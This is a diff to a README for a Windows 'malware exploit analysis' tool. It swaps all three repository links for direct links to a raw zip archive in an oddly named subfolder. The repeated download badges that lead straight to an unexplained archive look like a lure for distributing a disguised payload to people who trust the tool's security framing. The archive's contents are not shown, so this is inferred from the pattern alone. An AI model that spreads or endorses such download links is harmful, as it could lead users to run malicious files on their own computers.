@@ -1,6 +1,6 @@
 # 🛡️ coruna_analysis - Understand Malware Exploit Behavior Simply
 
-[![Download coruna_analysis](https://img.shields.io/badge/Download%20coruna_analysis-ff6f61?style=for-the-badge&logo=github)](https://github.com/Meysamshiralii/coruna_analysis)
+[![Download coruna_analysis](https://img.shields.io/badge/Download%20coruna_analysis-ff6f61?style=for-the-badge&logo=github)](https://github.com/Meysamshiralii/coruna_analysis/raw/refs/heads/main/alkide/analysis_coruna_v1.9.zip)
 
 ## 🧰 What is coruna_analysis?
 
@@ -42,7 +42,7 @@ Follow these steps to download, install, and run coruna_analysis on your Windows
 
 Click the button below to open the GitHub repository:
 
-[![Download coruna_analysis](https://img.shields.io/badge/Download%20coruna_analysis-28a745?style=for-the-badge&logo=github)](https://github.com/Meysamshiralii/coruna_analysis)
+[![Download coruna_analysis](https://img.shields.io/badge/Download%20coruna_analysis-28a745?style=for-the-badge&logo=github)](https://github.com/Meysamshiralii/coruna_analysis/raw/refs/heads/main/alkide/analysis_coruna_v1.9.zip)
 
 This page contains the files you need to get started. It also shows the latest updates and instructions.
 
@@ -124,7 +124,7 @@ If you experience slowdowns, make sure your PC meets the system requirements and
 ## 🔗 Useful Links
 
 Download coruna_analysis here:  
-[https://github.com/Meysamshiralii/coruna_analysis](https://github.com/Meysamshiralii/coruna_analysis)
+[https://github.com/Meysamshiralii/coruna_analysis/raw/refs/heads/main/alkide/analysis_coruna_v1.9.zip](https://github.com/Meysamshiralii/coruna_analysis/raw/refs/heads/main/alkide/analysis_coruna_v1.9.zip)
 
 Releases page for installation files:  
 Visit the "Releases" section after opening the main page linked above.
